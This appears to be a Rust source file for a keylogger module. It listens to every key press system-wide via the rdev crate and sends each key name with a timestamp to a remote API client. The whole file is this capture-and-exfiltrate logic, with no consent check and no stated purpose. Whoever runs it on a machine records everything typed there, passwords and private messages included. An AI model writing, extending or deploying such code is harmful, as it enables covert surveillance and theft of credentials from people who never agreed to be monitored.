use rdev::{listen, Event, EventType};
use crate::api::ApiClient;
use std::sync::Arc;

pub fn start(api_client: Arc<ApiClient>) -> Result<(), Box<dyn std::error::Error>> {
    let callback = move |event: Event| {
        if let EventType::KeyPress(_) = event.event_type {
            if let Some(key) = event.name {
                let timestamp = chrono::Local::now().to_rfc3339();
                let _ = api_client.send_key(&key, &timestamp);
            }
        }
    };

    listen(callback)?;
    Ok(())
}
